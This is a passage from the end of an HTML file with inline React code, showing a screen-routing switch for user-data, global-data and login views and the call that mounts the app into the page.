                    case 'DATA_VIEW': if (!appState.selectedTargetUser) return null; return <UserDataViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />;
                    case 'GLOBAL_DATA': return <GlobalDataViewer onBack={handleBackToHome} />;
                    default: return <Login onLoginSuccess={handleLoginSuccess} />;
                }
            };
            return renderScreen();
        };

        // --- RENDER ---
        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>